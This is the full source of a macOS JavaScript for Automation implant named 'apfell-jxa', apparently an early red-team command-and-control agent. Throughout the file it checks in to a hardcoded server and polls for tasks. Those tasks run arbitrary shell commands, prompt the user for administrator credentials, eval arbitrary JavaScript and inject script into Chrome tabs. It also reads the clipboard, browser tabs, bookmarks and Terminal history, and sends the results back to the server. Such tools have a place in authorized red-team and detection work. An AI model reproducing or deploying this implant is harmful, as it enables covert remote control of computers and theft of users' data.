ObjC.import('Cocoa');
ObjC.import('Foundation'); //there by default I think, but safe to include anyway
ObjC.import('stdlib');
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;
//--------------IMPLANT INFORMATION-----------------------------------
class implant{
	constructor(){
		this.procInfo = $.NSProcessInfo.processInfo;
		this.hostInfo = $.NSHost.currentHost;
		this.id = -1;
		this.user = ObjC.unwrap(this.procInfo.userName);
		this.fullName = ObjC.unwrap(this.procInfo.fullUserName);
		//every element in the array needs to be unwrapped
		this.ip = ObjC.unwrap(this.hostInfo.addresses); //probably just need [0]
		this.pid = this.procInfo.processIdentifier;
		//every element in the array needs to be unwrapped
		this.host = ObjC.unwrap(this.hostInfo.names); //probably just need [0]
		this.killdate = "";
		//this is a dictionary, but every 'value' needs to be unwrapped
		this.environment = ObjC.unwrap(this.procInfo.environment);
		this.uptime = this.procInfo.systemUptime;
		//every element in the array needs to be unwrapped
		this.args = ObjC.unwrap(this.procInfo.arguments);
		this.payload_type = 'apfell-jxa';	
		this.osVersion = this.procInfo.operatingSystemVersionString;
	}
}
apfell = new implant();
//--------------Basic C2 INFORMATION----------------------------------------
//https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes
class baseC2{
	//To create your own C2, extend this class and implement the required functions
	//The main code depends on the mechanism being C2 with these functions.
	//   the implementation of the functions doesn't matter though
	constructor(interval){
		this.interval = interval; //seconds between callbacks
	}
	getInterval(){
		return this.interval;
	}
	checkin(){
		//check in with c2 server
	}
	getTasking(){
		//reach out to wherever to get tasking
	}
	getConfig(){
		//gets the current configuration for tasking
	}
	postResponse(){
		//output a response to a task
	}
	setConfig(){
		//updates the current configuration for how to get tasking
	}
}
//-------------RESTFUL C2 mechanisms ---------------------------------
class RestC2 extends baseC2{
	constructor(interval, baseurl){
		super(interval);
		this.baseurl = baseurl;
	}
	checkin(ip, pid, user, host){
		//get info about system to check in initially
		//needs IP, PID, user, host, payload_type
		//gets back a unique ID
		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'payload_type':apfell.payload_type};
		//calls htmlPostData(url,data) to actually checkin
		var jsondata = this.htmlPostData("api/v1.0/callbacks/", JSON.stringify(info));	
		apfell.id = jsondata.id;
		return jsondata;
	}
	getTasking(){
		// http://ip/api/v1.0/tasks/callback/{implant.id}/nextTask
		var url = this.baseurl + "api/v1.0/tasks/callback/" + apfell.id + "/nextTask";
		var task = this.htmlGetData(url);
		return JSON.parse(task);
	}
	postResponse(urlEnding, data){
		//depending on the amount of data we're sending, we might need to chunk it
		//  current chunks at 5kB, but we can change that later
		var size=5000;
		//console.log("total response size: " + data.length);
		for(var i = 0; i < data.length; i+=size){
			//console.log(i);
			var chunk = data.substring(i,i+size);
			//console.log(chunk);
			//base64 encode each chunk before we send it
			var chunk_nsstring = $.NSString.alloc.initWithCStringEncoding(chunk, $.NSData.NSUnicodeStringEncoding);
			//console.log(chunk_nsstring);
			var data_chunk = chunk_nsstring.dataUsingEncoding($.NSData.NSUTF16StringEncoding);
			//console.log(data_chunk);
			var encoded_chunk = data_chunk.base64EncodedStringWithOptions(0).js;
			//console.log(encoded_chunk);
			var post_data = {"response":encoded_chunk};
			var jsondata = this.htmlPostData(urlEnding, JSON.stringify(post_data));
			//console.log("returned data: " + JSON.stringify(jsondata));
		}
		return jsondata;
	}
	htmlPostData(urlEnding, sendData){
		while(true){
			try{ //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
				//console.log("posting: " + sendData + " to " + urlEnding);
				var url = this.baseurl + urlEnding;
				//console.log(url);
				var data = $.NSString.alloc.initWithUTF8String(sendData);
				var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
				var postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
				var postLength = $.NSString.stringWithFormat("%d", postData.length);
				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
				req.setHTTPBody(postData);
				var response = Ref();
				var error = Ref();
				var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
				var resp = ObjC.unwrap($.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding));
				//console.log(resp);
				var jsondata = JSON.parse(resp);
				return jsondata;
			}
			catch(error){
			}
		}
	}
	htmlGetData(url){
		return ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(url)),$.NSUTF8StringEncoding));
	}
}
C2 = new RestC2(10, "http://192.168.0.119/"); //defaulting to 10 second callbacks
//-------------MAIN EXECUTION LOOP ----------------------------------
for(var i=0; i < apfell.ip.length; i++){
	ip = apfell.ip[i];
	if (ip.js.includes(".") && ip.js != "127.0.0.1"){
		console.log("found ip, checking in");
		C2.checkin(ip.js,apfell.pid,apfell.user,ObjC.unwrap(apfell.host[0]));
		break;
	}
}
shell = function(command){
	//simply run a shell command via doShellScript and return the response
	try{
		response = currentApp.doShellScript(command);
	}
	catch(error){
		response = error;
	}
	return response;
}
shell_elevated = function(command, prompt){
	//this will prompt the user for creds - if successful, they'll be cached for us for 5 min
	try{
		response = currentApp.doShellScript(command, {administratorPrivileges:true,withPrompt:prompt});
	}
	catch(error){
		response = error;
	}
	return response;
}
js = function(command){
	//simply eval a javascript string and return the response
	try{
		response = eval(command);
	}
	catch(error){
		response = error;
	}
	return response;
}
shell_api = function(path, args){
	//launch a program and args via ObjC bridge without doShellScript and return response
	try{
		var pipe = $.NSPipe.pipe;
		var file = pipe.fileHandleForReading;  // NSFileHandle
		var task = $.NSTask.alloc.init;
		task.launchPath = path; //'/bin/ps'
		task.arguments = args; //['aux']
		task.standardOutput = pipe;  // if not specified, literally writes to file handles 1 and 2
		task.standardError = pipe;
		task.launch; // Run the command `ps aux`
		var data = file.readDataToEndOfFile;  // NSData, potential to hang here?
		file.closeFile
		// Call -[[NSString alloc] initWithData:encoding:]
		data = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding)
		response = ObjC.unwrap(data);
	}
	catch(error){
		response = error;
	}
	return response;
}
launch_app = function(identifier){
	try{
		ObjC.import('AppKit')
		$.NSWorkspace.sharedWorkspace.launchAppWithBundleIdentifierOptionsAdditionalEventParamDescriptorLaunchIdentifier(
		  identifier,
		  $.NSWorkspaceLaunchAsync | $.NSWorkspaceLaunchAndHide | $.NSWorkspaceLaunchWithoutAddingToRecents ,
		  $.NSAppleEventDescriptor.nullDescriptor,
		  null
		)
		response = 'success';
	}
	catch(error){
		response = error;
	}
	return response;
}
clipboard_read = function(){
	try{
		return currentApp.theClipboard();
	}
	catch(error){
		return error;
	}
}
clipboard_set = function(data){
	try{
		currentApp.setTheClipboardTo(data);
		response = 'success';
	}
	catch(error){
		response = error;
	}
	return response;
}
list_running_apps = function(verbose){
	var procs = Application("System Events").processes;
	var names = [];
	for (var i = 0; i < procs.length; i++){
		var info = "Name: " + procs[i].name() +
		"\npid: " + procs[i].id() +
		"\ndisplayedName: " + procs[i].displayedName() +
		"\nshortName: " + procs[i].shortName() +
		"\nfile: " + procs[i].file().typeIdentifier();
		if(verbose){
			info += "\nHighLevelEvents: " + procs[i].acceptsHighLevelEvents() +
			"\nRemoteEvents: " + procs[i].acceptsRemoteEvents() +
			"\nArchitecture: " + procs[i].architecture() +
			"\nBackgroundOnly:" + procs[i].backgroundOnly() +
			"\nBundleIdentifer:" + procs[i].bundleIdentifier() +
			"\nclassic: " + procs[i].classic() +
			"\ncreatorType: " + procs[i].creatorType() +
			"\nfileType: " + procs[i].fileType() +
			"\nfrontmost: " + procs[i].frontmost() +
			"\nScriptable: " + procs[i].hasScriptingTerminology() +
			"\npartitionSpaceUsed: " + procs[i].partitionSpaceUsed() +
			"\ntotalPartitionSize: " + procs[i].totalPartitionSize() +
			"\nunixId: " + procs[i].unixId() +
			"\nvisible: " + procs[i].visible();
		}
		names.push(info);
	}
	return JSON.stringify(names);
}
list_users = function(method){
	all_users = [];
	if(method == "jxa"){
		var users = Application("System Events").users;
		for (var i = 0; i < users.length; i++){
			var info = "Name: " + users[i].name() +
			"\nFullName: " + users[i].fullName() +
			"\nhomeDirectory: " + users[i].homeDirectory() +
			"\npicturePath: " + users[i].picturePath();
			all_users.push(info)
		}
	}
	return JSON.stringify(all_users);
}
get_current_user = function(method){
	if(method == "jxa"){
		var user = Application("System Events").currentUser;
		var info = "Name: " + user.name() +
		"\nFullName: " + user.fullName() +
		"\nhomeDirectory: " + user.homeDirectory() +
		"\npicturePath: " + user.picturePath();
		return info;
	}
}
get_security_info = function(method){
	if(method == "jxa"){
		var secObj = Application("System Events").securityPreferences();
		var info = "automaticLogin: " + secObj.automaticLogin() +
		"\nlogOutWhenInactive: " + secObj.logOutWhenInactive() +
		"\nlogOutWhenInactiveInterval: " + secObj.logOutWhenInactiveInterval() +
		"\nrequirePasswordToUnlock: " + secObj.requirePasswordToUnlock() +
		"\nrequirePasswordToWake: " + secObj.requirePasswordToWake();
		//"\nsecureVirtualMemory: " + secObj.secureVirtualMemory(); //might need to be in an elevated context
		return info;
	}
}
list_chrome_tabs = function(){
	var tabs = [];
	try{
		var ch = Application("Google Chrome");
		for (var i = 0; i < ch.windows.length; i++){
			var win = ch.windows[i];
			for (var j = 0; j < win.tabs.length; j++){
				var tab = win.tabs[j];
				var info = "Title: " + tab.title() +
				"\nURL: " + tab.url() +
				"\nWin/Tab: " + i + "/" + j;
				tabs.push(info);
			}
		}
	}catch(error){
		return error;
	}
	return JSON.stringify(tabs);
}
list_chrome_bookmarks = function(){
	var all_data = [];
	try{
		var ch = Application("Google Chrome");
		var folders = ch.bookmarkFolders;
		for (var i = 0; i < folders.length; i ++){
			var folder = folders[i];
			var bookmarks = folder.bookmarkItems;
			all_data.push("Folder Name: " + folder.title());
			for (var j = 0; j < bookmarks.length; j++){
				var info = "Title: " + bookmarks[j].title() +
				"\nURL: " + bookmarks[j].url() +
				"\nindex: " + bookmarks[j].index() +
				"\nFolder/bookmark: " + i + "/" + j;
				all_data.push(info); //populate our array
			}
		}
	}catch(error){
		return error;
	}
	return JSON.stringify(all_data);
}
js_in_chrome_tab = function(win, tab, code){
	try{
		Application("Chrome").windows[win].tabs[tab].execute({javascript:code});
		return "completed";
	}
	catch(error){
		return error;
	}
}
get_system_info = function(method){
	if(method == "jxa"){
		return JSON.stringify(currentApp.systemInfo());
	}
}
list_terminal_info = function(history, contents){
	var all_data = {};
	try{
		var term = Application("Terminal");
		var windows = term.windows;
		for(var i = 0; i < windows.length; i++){
			var win_info = "Name: " + windows[i].name() +
			"\nVisible: " + windows[i].visible() +
			"\nFrontmost: " + windows[i].frontmost();
			var all_tabs = [];
			// store the windows information in id_win in all_data
			all_data[i + "_win"] = win_info;
			for(var j = 0; j < windows[i].tabs.length; j++){
				var tab_info = "Win/Tab: " + i + "/" + j +
				"\nBusy: " + windows[i].tabs[j].busy() +
				"\nProcesses: " + windows[i].tabs[j].processes() +
				"\nSelected: " + windows[i].tabs[j].selected() +
				"\nTTY: " + windows[i].tabs[j].tty();
				if(windows[i].tabs[j].titleDisplaysCustomTitle()){
					tab_info += "\nCustomTitle: " + windows[i].tabs[j].customTitle();
				}
				if(history){
					tab_info += "\nHistory: " + windows[i].tabs[j].history();
				}
				if(contents){
					tab_info += "\nContents: " + windows[i].tabs[j].contents();
				}
				all_tabs.push(tab_info);
			}
			// store all of the tab information corresponding to that window id at id_tabs
			all_data[i + "_tabs"] = all_tabs;
		}

	}catch(error){
		all_data['error'] = error;
	}
	return JSON.stringify(all_data);
}
shell_in_term_tab = function(window, tab, command){
	var output = "";
	try{
		var term = Application("Terminal");
		term.doScript(command, {in:term.windows[window].tabs[tab]});
	}
	catch(error){
		output = error;
	}
	return output;
}

sleepWakeUp = function(t){
	var response;
	console.log("checking for tasking");
	task = C2.getTasking();
	try{
		var command = ObjC.unwrap(task["command"]);
		if(command != "none"){
			var params = ObjC.unwrap(task["params"]);
			// params will either be a single parameter or JSON of multiple params
			//console.log(JSON.stringify(task));
			//console.log("processing task");
			if(command == "shell"){
				output = shell(params);
			}
			else if(command == "shell_elevated"){
				//takes in a command and a prompt. if no prompt given, uses the default
				pieces = JSON.parse(params);
				//pieces should have a command and prompt field
				output = shell_elevated(pieces['command'], pieces['prompt']);
			}
			else if(command == "js"){
				output = js(params);
			}
			else if(command == "jsb"){
				output = ObjC.deepUnwrap(js(params));
			}
			else if(command == "shell_api"){
				//params should be the full path of the binary followed by all of the arguments
				pieces = JSON.parse(params);
				//pieces should have a path and an array of arguments
				output = shell_api(pieces['path'], pieces['args']);
			}
			else if(command == "launchapp"){
				//this should be the bundle identifier like com.apple.itunes to launch
				//it will launch hidden, asynchronously, and will be 'hidden' (still shows up in the dock though)
				output = launch_app(params);
			}
			else if(command == "clipboard"){
				if(params.length > 0){
					//this means we're setting the clipboard to something
					output = clipboard_set(params);
				}
				else{
					//this means we're just getting the clipboard
					output = clipboard_read();
				}
			}
			else if(command == "list_apps"){
				//This takes at most one parameter to specify verbose information
				output = list_running_apps(params);
			}
			else if(command == "list_users"){
				//this outputs all the users based on the method specified
				//  should be called: list_users jxa
				if(params.length > 0){
					output = list_users(params);
				}
				else{
					//if no method is specified, we default to jxa for now
					output = list_users("jxa");
				}
			}
			else if(command == "current_user"){
				//outputs info about the current user based on the method specified
				//  should be called: current_user jxa
				if(params.length > 0){
					output = get_current_user(params);
				}
				else{
					//if no method is specified, default to jxa for now
					output = get_current_user("jxa");
				}
			}
			else if(command == "security_info"){
				//gets some security information about the system
				if(params.length > 0){
					output = get_security_info(params);
				}
				else{
					//if no method is specified, default to jxa for now
					output = get_security_info("jxa");
				}
			}
			else if(command == "chrome_tabs"){
				//list information about chrome tabs in all open Chrome windows
				output = list_chrome_tabs();
			}
			else if(command == "chrome_bookmarks"){
				//gets all of the current chrome bookmarks
				output = list_chrome_bookmarks();
			}
			else if(command == "js_chrome"){
				split_params = params.split(" ");
				//pieces should have a window #, tab #, and string of code to execute
				output = js_in_chrome_tab(split_params[0], split_params[1], split_params.slice(2, ).join(" "));
			}
			else if(command == "system_info"){
				//gets the system info via the provided method
				if(params.length > 0){
					output = get_system_info(params);
				}
				else{
					//if no method is specified, default to jxa for now
					output = get_system_info("jxa");
				}
			}
			else if(command == "terminals"){
				//this is the terminals section (read or send data to)
				split_params = params.split(" ");
				if(split_params[0] == "read"){
					//this means command is: terminals read [history] [contents]
					var history = false;
					var contents = false;
					if(split_params.includes('history')){
						history = true;
					}
					if(split_params.includes('contents')){
						contents = true;
					}
					output = list_terminal_info(history, contents);
				}
				else if(split_params[0] == "send"){
					//this means command is: terminals send win tab command(s)
					//  the required information can be gained from the 'terminals read' command
					output = shell_in_term_tab(split_params[1], split_params[2], split_params.slice(3, ).join(" "));
				}
				else{
					output = "unknown terminals command";
				}

			}
			else if(command == "exit"){
				$.NSApplication.sharedApplication.terminate(this);
			}
			else {
				output = "command not supported: " + command + " " + params;
			}
			//response = {"response": output.toString()};
			//console.log(response);
			//console.log("posting response"); //tasking needs to give info on how to respond to that task
			C2.postResponse("api/v1.0/tasks/" + task.id, output);
		}
	}
	catch(error){
		console.log(error);
	}
	task["command"] = "none"; //reset just in case something goes weird
};
//https://stackoverflow.com/questions/37834749/settimout-with-javascript-for-automation
timer = $.NSTimer.scheduledTimerWithTimeIntervalRepeatsBlock(C2.interval, true, sleepWakeUp);
$.NSRunLoop.currentRunLoop.addTimerForMode(timer, "timer");
$.NSRunLoop.currentRunLoop.runModeBeforeDate("timer", $.NSDate.distantFuture);
//timer.invalidate will cause it to stop triggering